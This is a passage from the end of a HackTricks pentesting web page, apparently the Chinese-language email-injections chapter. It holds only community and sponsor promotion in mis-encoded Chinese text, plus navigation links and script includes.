<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>ç”µæŠ¥ç¾¤ç»„</strong></a> æˆ– <strong>åœ¨ Twitter ä¸Šå…³æ³¨</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
<p><br />
ä½¿ç”¨ <a href="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=text&amp;utm_campaign=ppc&amp;utm_content=email-injections"><strong>Trickest</strong></a> è½»æ¾æ„å»ºå’Œ <strong>è‡ªåŠ¨åŒ–å·¥ä½œæµ</strong>ï¼Œç”±ä¸–ç•Œä¸Š <strong>æœ€å…ˆè¿›</strong> çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚<br />
ä»Šå¤©å°±è·å–è®¿é—®æƒé™ï¼š</p>
<p>{% embed url="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=banner&amp;utm_campaign=ppc&amp;utm_content=email-injections" %}</p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../pentesting-web/domain-subdomain-takeover.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../pentesting-web/file-inclusion/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../pentesting-web/domain-subdomain-takeover.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../pentesting-web/file-inclusion/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../elasticlunr.min.js"></script>
        <script src="../mark.min.js"></script>
        <script src="../searcher.js"></script>

        <script src="../clipboard.min.js"></script>
        <script src="../highlight.js"></script>
        <script src="../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
